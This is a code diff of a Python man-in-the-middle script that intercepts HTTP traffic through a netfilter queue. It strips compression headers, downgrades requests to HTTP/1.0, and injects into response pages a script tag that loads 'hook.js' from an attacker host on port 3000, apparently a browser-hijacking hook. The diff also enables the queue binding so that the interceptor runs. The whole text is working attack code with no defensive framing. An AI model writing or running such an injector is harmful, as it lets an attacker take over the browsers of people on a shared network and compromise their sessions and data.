@@ -19,13 +19,14 @@ def process_packet(packet):
     if http_packet.haslayer(scapy.Raw):
         try:
             load = http_packet[scapy.Raw].load.decode()
-            if http_packet[scapy.TCP].dport == 80:
+            if http_packet[scapy.TCP].dport == 8080:
                 print("[+] Request...")
                 load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+                load = load.replace("HTTP/1.1", "HTTP/1.0")  # for chunked HTTP 1.1
 
-            elif http_packet[scapy.TCP].sport == 80:
+            elif http_packet[scapy.TCP].sport == 8080:
                 print("[+] Response...")
-                injection_code = '<script src="http://x.x.x.x:3000/hook.js"></script>'
+                injection_code = '<script src="http://192.168.x.y:3000/hook.js"></script>'
                 load = load.replace("</body>", injection_code + "</body>")
                 content_length_search = re.search("(?:Content-Length:\\s)(\\d*)", load)
 
@@ -42,6 +43,7 @@ def process_packet(packet):
     packet.accept()
     send(http_packet)
 
-# queue = netfilterqueue.NetfilterQueue()
-# queue.bind(0, process_packet)
-# queue.run()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
